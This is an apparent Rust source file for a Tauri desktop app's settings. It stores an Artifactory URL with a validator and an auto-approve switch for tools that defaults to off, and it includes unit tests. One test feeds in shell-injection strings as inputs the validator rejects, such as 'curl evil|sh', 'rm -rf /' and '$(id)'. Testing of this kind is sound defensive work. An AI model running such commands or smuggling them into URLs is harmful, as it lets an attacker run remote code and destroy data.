use sqlx::SqlitePool;
use tauri::State;

pub const KEY_ARTIFACTORY_BASE_URL: &str = "artifactory_base_url";
pub const DEFAULT_ARTIFACTORY_BASE_URL: &str =
    "https://cmc-szver-artifactory.cmc.tools.huawei.com/artifactory/cmc-software-release";

pub const KEY_AUTO_APPROVE_TOOLS: &str = "auto_approve_tools";

/// 读取设置项，未设置时返回 None
pub async fn get_setting(pool: &SqlitePool, key: &str) -> Result<Option<String>, sqlx::Error> {
    let value: Option<String> = sqlx::query_scalar("SELECT value FROM app_settings WHERE key = ?")
        .bind(key)
        .fetch_optional(pool)
        .await?;
    Ok(value)
}

/// 写入设置项（upsert）
pub async fn set_setting(pool: &SqlitePool, key: &str, value: &str) -> Result<(), sqlx::Error> {
    sqlx::query(
        "INSERT INTO app_settings (key, value, updated_at) VALUES (?, ?, ?) \
         ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at",
    )
    .bind(key)
    .bind(value)
    .bind(chrono::Utc::now().to_rfc3339())
    .execute(pool)
    .await?;
    Ok(())
}

/// 读取 Artifactory base URL：未设置时返回默认值
pub async fn artifactory_base_url(pool: &SqlitePool) -> Result<String, sqlx::Error> {
    Ok(get_setting(pool, KEY_ARTIFACTORY_BASE_URL)
        .await?
        .unwrap_or_else(|| DEFAULT_ARTIFACTORY_BASE_URL.to_string()))
}

/// 校验并规范化 base URL：去首尾空白、去尾部斜杠；返回错误信息或规范化后的值
pub fn normalize_base_url(input: &str) -> Result<String, String> {
    let url = input.trim().trim_end_matches('/');
    if url.is_empty() {
        return Err("base url cannot be empty".to_string());
    }
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return Err("base url must start with http:// or https://".to_string());
    }
    let url_chars_ok = url.chars().all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, ':' | '/' | '.' | '-' | '_' | '~' | '+')
    });
    if !url_chars_ok {
        return Err("base url contains unsupported characters (allowed: alphanumerics and : / . - _ ~ +)".to_string());
    }
    Ok(url.to_string())
}

/// 读取免确认模式开关：缺失、非法值、DB 错误一律返回 false（fail-safe，
/// 绝不因读不到设置而放行高风险操作）
pub async fn auto_approve_tools(pool: &SqlitePool) -> bool {
    match get_setting(pool, KEY_AUTO_APPROVE_TOOLS).await {
        Ok(Some(value)) if value == "true" => true,
        Ok(Some(value)) if value == "false" => false,
        Ok(Some(value)) => {
            tracing::warn!(
                key = KEY_AUTO_APPROVE_TOOLS,
                value = %value,
                "invalid auto_approve_tools value, falling back to false"
            );
            false
        }
        Ok(None) => false,
        Err(e) => {
            tracing::warn!(
                key = KEY_AUTO_APPROVE_TOOLS,
                error = %e,
                "failed to read auto_approve_tools, falling back to false"
            );
            false
        }
    }
}

#[tauri::command]
#[tracing::instrument(skip(state))]
pub async fn get_artifactory_base_url_cmd(state: State<'_, crate::AppState>) -> Result<String, String> {
    tracing::info!("get_artifactory_base_url_cmd called");
    artifactory_base_url(&state.db)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
#[tracing::instrument(skip(state))]
pub async fn set_artifactory_base_url_cmd(
    state: State<'_, crate::AppState>,
    url: String,
) -> Result<(), String> {
    tracing::info!(url = %url, "set_artifactory_base_url_cmd called");
    let normalized = normalize_base_url(&url)?;
    set_setting(&state.db, KEY_ARTIFACTORY_BASE_URL, &normalized)
        .await
        .map_err(|e| e.to_string())
}

#[tauri::command]
#[tracing::instrument(skip(state))]
pub async fn get_auto_approve_tools_cmd(state: State<'_, crate::AppState>) -> Result<bool, String> {
    tracing::info!("get_auto_approve_tools_cmd called");
    Ok(auto_approve_tools(&state.db).await)
}

#[tauri::command]
#[tracing::instrument(skip(state))]
pub async fn set_auto_approve_tools_cmd(
    state: State<'_, crate::AppState>,
    enabled: bool,
) -> Result<(), String> {
    tracing::info!(enabled = enabled, "set_auto_approve_tools_cmd called");
    let value = if enabled { "true" } else { "false" };
    set_setting(&state.db, KEY_AUTO_APPROVE_TOOLS, value)
        .await
        .map_err(|e| {
            tracing::error!(key = KEY_AUTO_APPROVE_TOOLS, error = %e, "failed to persist auto_approve_tools");
            e.to_string()
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_get_setting_missing_returns_none() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        assert!(get_setting(&pool, "nope").await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_set_then_get_roundtrip() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, "k1", "v1").await.unwrap();
        assert_eq!(get_setting(&pool, "k1").await.unwrap().as_deref(), Some("v1"));
    }

    #[tokio::test]
    async fn test_set_setting_upsert_overwrites() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, "k1", "v1").await.unwrap();
        set_setting(&pool, "k1", "v2").await.unwrap();
        assert_eq!(get_setting(&pool, "k1").await.unwrap().as_deref(), Some("v2"));
    }

    #[tokio::test]
    async fn test_artifactory_base_url_defaults_when_unset() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        assert_eq!(artifactory_base_url(&pool).await.unwrap(), DEFAULT_ARTIFACTORY_BASE_URL);
    }

    #[tokio::test]
    async fn test_artifactory_base_url_returns_custom() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, KEY_ARTIFACTORY_BASE_URL, "https://example.com/artifactory").await.unwrap();
        assert_eq!(
            artifactory_base_url(&pool).await.unwrap(),
            "https://example.com/artifactory"
        );
    }

    #[test]
    fn test_normalize_base_url_trims_and_strips_trailing_slash() {
        assert_eq!(normalize_base_url("  https://example.com/artifactory/  ").unwrap(), "https://example.com/artifactory");
        assert_eq!(normalize_base_url("https://example.com/a///").unwrap(), "https://example.com/a");
    }

    #[test]
    fn test_normalize_base_url_rejects_empty() {
        assert!(normalize_base_url("   ").is_err());
        assert!(normalize_base_url("").is_err());
    }

    #[test]
    fn test_normalize_base_url_rejects_non_http() {
        assert!(normalize_base_url("ftp://example.com/x").is_err());
        assert!(normalize_base_url("example.com/x").is_err());
    }

    #[test]
    fn test_normalize_base_url_rejects_shell_metacharacters_and_spaces() {
        assert!(normalize_base_url("https://x; curl evil|sh").is_err());
        assert!(normalize_base_url("https://x && rm -rf /").is_err());
        assert!(normalize_base_url("https://example.com/a b").is_err());
        assert!(normalize_base_url("https://example.com/a$(id)").is_err());
        assert!(normalize_base_url("https://example.com/a`id`").is_err());
        assert!(normalize_base_url("https://example.com/a'b'").is_err());
        assert!(normalize_base_url("https://example.com/a\"b").is_err());
    }

    #[test]
    fn test_normalize_base_url_accepts_typical_artifactory_urls() {
        assert!(normalize_base_url("https://cmc-szver-artifactory.cmc.tools.huawei.com/artifactory/cmc-software-release").is_ok());
        assert!(normalize_base_url("http://intranet-mirror.local:8081/artifactory/libs-release").is_ok());
        assert!(normalize_base_url("https://example.com/path_with~tilde+and.dots/").is_ok());
    }

    #[tokio::test]
    async fn test_artifactory_base_url_roundtrip_normalized() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, KEY_ARTIFACTORY_BASE_URL, "https://example.com/artifactory/").await.unwrap();
        assert_eq!(
            artifactory_base_url(&pool).await.unwrap(),
            "https://example.com/artifactory/"
        );
    }

    #[tokio::test]
    async fn test_auto_approve_tools_defaults_false_when_unset() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        assert!(!auto_approve_tools(&pool).await);
    }

    #[tokio::test]
    async fn test_auto_approve_tools_roundtrip() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, KEY_AUTO_APPROVE_TOOLS, "true").await.unwrap();
        assert!(auto_approve_tools(&pool).await);
        set_setting(&pool, KEY_AUTO_APPROVE_TOOLS, "false").await.unwrap();
        assert!(!auto_approve_tools(&pool).await);
    }

    #[tokio::test]
    async fn test_auto_approve_tools_invalid_value_falls_back_false() {
        let tmp = tempfile::tempdir().unwrap();
        let pool = crate::infra::db::init(tmp.path().join("friday.db")).await.unwrap();
        set_setting(&pool, KEY_AUTO_APPROVE_TOOLS, "yes").await.unwrap();
        assert!(!auto_approve_tools(&pool).await);
    }
}
